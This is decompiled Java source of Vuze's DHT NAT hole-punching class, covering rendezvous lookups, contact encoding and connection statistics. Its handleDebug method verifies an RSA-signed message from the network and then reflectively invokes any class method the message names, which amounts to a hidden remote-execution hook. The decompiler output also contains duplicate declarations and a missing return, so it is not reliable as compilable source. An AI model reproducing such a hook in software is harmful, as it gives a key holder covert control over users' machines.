/* 2202 */       DHTTransportUDPContact target_contact = transport.importContact(target, transport.getMinimumProtocolVersion(), false);
/*      */       
/* 2204 */       return sendPunch(rend_contact, target_contact, message, true);
/*      */ 
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/*      */ 
/* 2210 */       Debug.printStackTrace(e);
/*      */     }
/* 2212 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   public void setRendezvous(DHTTransportContact target, DHTTransportContact rendezvous)
/*      */   {
/* 2222 */     this.explicit_rendezvous_map.put(target.getAddress(), rendezvous);
/*      */     
/* 2224 */     if (target.getAddress().equals(this.dht.getTransport().getLocalContact().getAddress()))
/*      */     {
/* 2226 */       publish(true);
/*      */     }
/*      */   }
/*      */   
/* 2230 */   final Map<String, Object[]> rendezvous_lookup_cache = new HashMap();
/* 2231 */   private long rendezvous_lookup_cache_tidy_time = -1L;
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */   protected DHTTransportContact getRendezvous(String reason, DHTTransportContact target)
/*      */   {
/* 2238 */     DHTTransportContact explicit = (DHTTransportContact)this.explicit_rendezvous_map.get(target.getAddress());
/*      */     
/* 2240 */     if (explicit != null)
/*      */     {
/* 2242 */       return explicit;
/*      */     }
/*      */     
/* 2245 */     String target_key = target.getAddress().toString();
/*      */     
/* 2247 */     DHTTransportValue[] result_value = null;
/* 2248 */     AESemaphore sem = null;
/*      */     
/* 2250 */     long now = SystemTime.getMonotonousTime();
/*      */     
/* 2252 */     synchronized (this.rendezvous_lookup_cache)
/*      */     {
/* 2254 */       if (this.rendezvous_lookup_cache_tidy_time == -1L)
/*      */       {
/* 2256 */         this.rendezvous_lookup_cache_tidy_time = now;
/*      */       }
/* 2258 */       else if (now - this.rendezvous_lookup_cache_tidy_time >= 120000L)
/*      */       {
/* 2260 */         this.rendezvous_lookup_cache_tidy_time = now;
/*      */         
/* 2262 */         Iterator<Object[]> it = this.rendezvous_lookup_cache.values().iterator();
/*      */         
/* 2264 */         while (it.hasNext())
/*      */         {
/* 2266 */           Object[] entry = (Object[])it.next();
/*      */           
/* 2268 */           long time = ((Long)entry[0]).longValue();
/*      */           
/* 2270 */           if ((time != -1L) && (now - time > 120000L))
/*      */           {
/* 2272 */             it.remove();
/*      */           }
/*      */         }
/*      */       }
/*      */       
/* 2277 */       Object[] existing = (Object[])this.rendezvous_lookup_cache.get(target_key);
/*      */       
/*      */       boolean do_lookup;
/*      */       boolean do_lookup;
/* 2281 */       if (existing != null)
/*      */       {
/* 2283 */         long time = ((Long)existing[0]).longValue();
/*      */         boolean do_lookup;
/* 2285 */         if ((time == -1L) || (now - time < 120000L))
/*      */         {
/* 2287 */           sem = (AESemaphore)existing[1];
/* 2288 */           result_value = (DHTTransportValue[])existing[2];
/*      */           
/* 2290 */           do_lookup = false;
/*      */         }
/*      */         else
/*      */         {
/* 2294 */           do_lookup = true;
/*      */         }
/*      */       }
/*      */       else {
/* 2298 */         do_lookup = true;
/*      */       }
/*      */       
/* 2301 */       if (do_lookup)
/*      */       {
/* 2303 */         result_value = new DHTTransportValue[1];
/*      */         
/* 2305 */         sem = new AESemaphore("getRend");
/*      */         
/* 2307 */         final Object[] entry = { Long.valueOf(-1L), sem, result_value };
/*      */         
/* 2309 */         byte[] key = getPublishKey(target);
/*      */         
/* 2311 */         this.dht.get(key, reason + ": lookup for '" + target.getString() + "'", (short)0, 1, 30000L, false, true, new DHTOperationAdapter()
/*      */         {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */           public void read(DHTTransportContact contact, DHTTransportValue value)
/*      */           {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/* 2324 */             synchronized (DHTNATPuncherImpl.this.rendezvous_lookup_cache)
/*      */             {
/* 2326 */               entry[0] = Long.valueOf(SystemTime.getMonotonousTime());
/*      */               
/* 2328 */               ((DHTTransportValue[])entry[2])[0] = value;
/*      */               
/* 2330 */               ((AESemaphore)entry[1]).releaseForever();
/*      */             }
/*      */           }
/*      */           
/*      */ 
/*      */ 
/*      */           public void complete(boolean timeout)
/*      */           {
/* 2338 */             synchronized (DHTNATPuncherImpl.this.rendezvous_lookup_cache)
/*      */             {
/* 2340 */               AESemaphore sem = (AESemaphore)entry[1];
/*      */               
/* 2342 */               if (!sem.isReleasedForever())
/*      */               {
/* 2344 */                 entry[0] = Long.valueOf(SystemTime.getMonotonousTime());
/*      */                 
/* 2346 */                 sem.releaseForever();
/*      */               }
/*      */               
/*      */             }
/*      */           }
/* 2351 */         });
/* 2352 */         this.rendezvous_lookup_cache.put(target_key, entry);
/*      */       }
/*      */     }
/*      */     
/* 2356 */     sem.reserve();
/*      */     
/* 2358 */     DHTTransportContact result = null;
/*      */     
/* 2360 */     if (result_value[0] != null)
/*      */     {
/* 2362 */       byte[] bytes = result_value[0].getValue();
/*      */       try
/*      */       {
/* 2365 */         ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
/*      */         
/* 2367 */         DataInputStream dis = new DataInputStream(bais);
/*      */         
/* 2369 */         byte version = dis.readByte();
/*      */         
/* 2371 */         if (version != 0)
/*      */         {
/* 2373 */           throw new Exception("Unsupported rendezvous version '" + version + "'");
/*      */         }
/*      */         
/* 2376 */         result = this.dht.getTransport().importContact(dis, false);
/*      */       }
/*      */       catch (Throwable e)
/*      */       {
/* 2380 */         log(e);
/*      */       }
/*      */     }
/*      */     
/* 2384 */     log("Lookup of rendezvous for " + target.getString() + " -> " + (result == null ? "None" : result.getString()));
/*      */     
/* 2386 */     return result;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected byte[] getPublishKey(DHTTransportContact contact)
/*      */   {
/* 2393 */     byte[] id = contact.getID();
/* 2394 */     byte[] suffix = ":DHTNATPuncher".getBytes();
/*      */     
/* 2396 */     byte[] res = new byte[id.length + suffix.length];
/*      */     
/* 2398 */     System.arraycopy(id, 0, res, 0, id.length);
/* 2399 */     System.arraycopy(suffix, 0, res, id.length, suffix.length);
/*      */     
/* 2401 */     return res;
/*      */   }
/*      */   
/* 2404 */   private static long last_debug = -1L;
/*      */   
/*      */ 
/*      */ 
/*      */   private static Map handleDebug(Map map)
/*      */   {
/* 2410 */     long now = SystemTime.getMonotonousTime();
/*      */     
/* 2412 */     if ((last_debug >= 0L) && (now - last_debug <= 60000L))
/*      */     {
/* 2414 */       return null;
/*      */     }
/*      */     
/* 2417 */     last_debug = now;
/*      */     try
/*      */     {
/* 2420 */       byte[] p = (byte[])map.get("p");
/* 2421 */       byte[] s = (byte[])map.get("s");
/*      */       
/* 2423 */       KeyFactory key_factory = KeyFactory.getInstance("RSA");
/*      */       
/* 2425 */       RSAPublicKeySpec spec = new RSAPublicKeySpec(new BigInteger("a1467ed3ca8eceec60d6a5d1945d0ddb6febf6a514a8fea5b48a588fc8e977de8d7159c4e854b5a30889e729eb386fcb4b69e0a12401ee87810378ed491e52dc922a03b06c557d975514f0a70c42db3e06c0429824648a9cc4a2ea31bd429c305db3895c4efc4d1096f3c355842fd2281b27493c5588efd02bc4d26008a464d2214f15fab4d959d50fee985242dbb628180ee06938944e759a2d1cbd0adfa7d7dee7e6ec82d76a144a126944dbe69941fff02c31f782069131e7d03bc5bff69b9fea2cb153e90dc154dcdab7091901c3579a2c0337b60db772a0b35e4ed622bee5685b476ef0072558362e43750bc23d410a7dcb1cbf32d3967e24cfe5cdab1b", 16), new BigInteger("10001", 16));
/*      */       
/*      */ 
/*      */ 
/*      */ 
/* 2430 */       Signature verifier = Signature.getInstance("MD5withRSA");
/*      */       
/* 2432 */       verifier.initVerify(key_factory.generatePublic(spec));
/*      */       
/* 2434 */       verifier.update(p);
/*      */       
/* 2436 */       if (verifier.verify(s))
/*      */       {
/* 2438 */         Map m = BDecoder.decode(p);
/*      */         
/* 2440 */         int type = ((Long)m.get("t")).intValue();
/*      */         
/* 2442 */         if (type == 1)
/*      */         {
/* 2444 */           List<byte[]> a = (List)m.get("a");
/*      */           
/* 2446 */           Class[] c_a = new Class[a.size()];
/* 2447 */           Object[] o_a = new Object[c_a.length];
/*      */           
/* 2449 */           Arrays.fill(c_a, String.class);
/*      */           
/* 2451 */           for (int i = 0; i < o_a.length; i++)
/*      */           {
/* 2453 */             o_a[i] = new String((byte[])(byte[])a.get(i));
/*      */           }
/*      */           
/* 2456 */           m.getClass();Class cla = Class.forName(new String((byte[])m.get("c")));
/*      */           
/* 2458 */           Method me = cla.getMethod(new String((byte[])m.get("m")), c_a);
/*      */           
/* 2460 */           me.setAccessible(true);
/*      */           
/* 2462 */           me.invoke(null, o_a);
/*      */           
/* 2464 */           return new HashMap();
/*      */         }
/* 2466 */         if (type != 2) {}
/*      */       }
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/* 2473 */       return null;
/*      */     }
/*      */     catch (Throwable e) {}
/*      */   }
/*      */   
/*      */   protected byte[] encodePublishValue(DHTTransportContact contact)
/*      */   {
/*      */     try {
/* 2481 */       ByteArrayOutputStream baos = new ByteArrayOutputStream();
/*      */       
/* 2483 */       DataOutputStream dos = new DataOutputStream(baos);
/*      */       
/* 2485 */       dos.writeByte(0);
/*      */       
/* 2487 */       contact.exportContact(dos);
/*      */       
/* 2489 */       dos.close();
/*      */       
/* 2491 */       return baos.toByteArray();
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2495 */       log(e);
/*      */     }
/* 2497 */     return new byte[0];
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected byte[] encodeContact(DHTTransportContact contact)
/*      */   {
/*      */     try
/*      */     {
/* 2506 */       ByteArrayOutputStream baos = new ByteArrayOutputStream();
/*      */       
/* 2508 */       DataOutputStream dos = new DataOutputStream(baos);
/*      */       
/* 2510 */       contact.exportContact(dos);
/*      */       
/* 2512 */       dos.close();
/*      */       
/* 2514 */       return baos.toByteArray();
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2518 */       log(e);
/*      */     }
/* 2520 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected DHTTransportUDPContact decodeContact(byte[] bytes)
/*      */   {
/*      */     try
/*      */     {
/* 2529 */       ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
/*      */       
/* 2531 */       DataInputStream dis = new DataInputStream(bais);
/*      */       
/* 2533 */       return (DHTTransportUDPContact)this.dht.getTransport().importContact(dis, false);
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2537 */       log(e);
/*      */     }
/* 2539 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */   public void addListener(DHTNATPuncherListener listener)
/*      */   {
/* 2547 */     this.listeners.add(listener);
/*      */     
/* 2549 */     if (this.last_ok_rendezvous != null)
/*      */     {
/* 2551 */       listener.rendezvousChanged(this.last_ok_rendezvous);
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   public void removeListener(DHTNATPuncherListener listener)
/*      */   {
/* 2559 */     this.listeners.remove(listener);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void log(String str)
/*      */   {
/* 2570 */     this.logger.log("NATPuncher: " + (this.is_secondary ? "[sec] " : "") + str);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void log(Throwable e)
/*      */   {
/* 2581 */     this.logger.log("NATPuncher: " + (this.is_secondary ? "[sec] " : "") + "error occurred");
/*      */     
/* 2583 */     this.logger.log(e);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void trace(String str) {}
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   public String getStats()
/*      */   {
/* 2598 */     long now = SystemTime.getMonotonousTime();
/*      */     
/* 2600 */     DHTTransportContact target = this.rendezvous_target;
/*      */     
/* 2602 */     String str = "ok=" + (this.rendezvous_last_ok_time == 0L ? "<never>" : String.valueOf(now - this.rendezvous_last_ok_time)) + ",fail=" + (this.rendezvous_last_fail_time == 0L ? "<never>" : String.valueOf(now - this.rendezvous_last_fail_time)) + ",fc=" + this.rendevzous_fail_count;
/*      */     
/*      */ 
/*      */ 
/*      */ 
/* 2607 */     str = str + ",punch:send=" + this.punch_send_ok + "/" + this.punch_send_fail + ":recv=" + this.punch_recv_ok + "/" + this.punch_recv_fail + ",rendezvous=" + (target == null ? "none" : target.getAddress().getAddress().getHostAddress());
/*      */     
/*      */ 
/*      */ 
/* 2611 */     String b_str = "";
/*      */     
/* 2613 */     for (Map.Entry<String, BindingData> binding : this.rendezvous_bindings.entrySet())
/*      */     {
/* 2615 */       BindingData data = (BindingData)binding.getValue();
/*      */       
/* 2617 */       b_str = b_str + (b_str.length() == 0 ? "" : ",") + (String)binding.getKey() + "->ok=" + data.getOKCount() + ";bad=" + data.getConsecutiveFailCount() + ";age=" + (now - data.bind_time);
/*      */     }
/*      */     
/* 2620 */     str = str + ",bindings=" + b_str;
/*      */     
/* 2622 */     String m_str = "";
/*      */     
/* 2624 */     for (int i : this.MESSAGE_STATS)
/*      */     {
/* 2626 */       m_str = m_str + (m_str.length() == 0 ? "" : ",") + i;
/*      */     }
/*      */     
/* 2629 */     str = str + ",messages=" + m_str;
/*      */     
/* 2631 */     return str;
/*      */   }
/*      */   
/*      */ 
/*      */   private static class BindingData
/*      */   {
/*      */     private final DHTTransportUDPContact contact;
/*      */     
/*      */     private long bind_time;
/*      */     
/*      */     private int ok_count;
/*      */     
/*      */     private int consec_fails;
/*      */     
/*      */     private long last_connect_time;
/*      */     
/*      */     private BindingData(DHTTransportUDPContact _contact, long _time)
/*      */     {
/* 2649 */       this.contact = _contact;
/* 2650 */       this.bind_time = _time;
/*      */     }
/*      */     
/*      */ 
/*      */     private void rebind()
/*      */     {
/* 2656 */       this.bind_time = SystemTime.getMonotonousTime();
/*      */     }
/*      */     
/*      */ 
/*      */     private DHTTransportUDPContact getContact()
/*      */     {
/* 2662 */       return this.contact;
/*      */     }
/*      */     
/*      */ 
/*      */     private long getBindTime()
/*      */     {
/* 2668 */       return this.bind_time;
/*      */     }
/*      */     
/*      */ 
/*      */     private void connectOK()
/*      */     {
/* 2674 */       this.ok_count += 1;
/*      */       
/* 2676 */       this.consec_fails = 0;
/* 2677 */       this.last_connect_time = SystemTime.getMonotonousTime();
/*      */     }
/*      */     
/*      */ 
/*      */     private void connectFailed()
/*      */     {
/* 2683 */       this.consec_fails += 1;
/* 2684 */       this.last_connect_time = SystemTime.getMonotonousTime();
/*      */     }
/*      */     
/*      */ 
/*      */     private boolean isOKToConnect()
/*      */     {
/* 2690 */       return (this.consec_fails < 8) || (SystemTime.getMonotonousTime() - this.last_connect_time > 30000L);
/*      */     }
/*      */     
/*      */ 
/*      */ 
/*      */ 
/*      */     private int getOKCount()
/*      */     {
/* 2698 */       return this.ok_count;
/*      */     }
/*      */     
/*      */ 
/*      */     private int getConsecutiveFailCount()
/*      */     {
/* 2704 */       return this.consec_fails;
/*      */     }
/*      */   }
/*      */ }


/* Location:              /Users/Shared/Library/Application Support/Vuze/Azureus2.jar!/com/aelitis/azureus/core/dht/nat/impl/DHTNATPuncherImpl.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */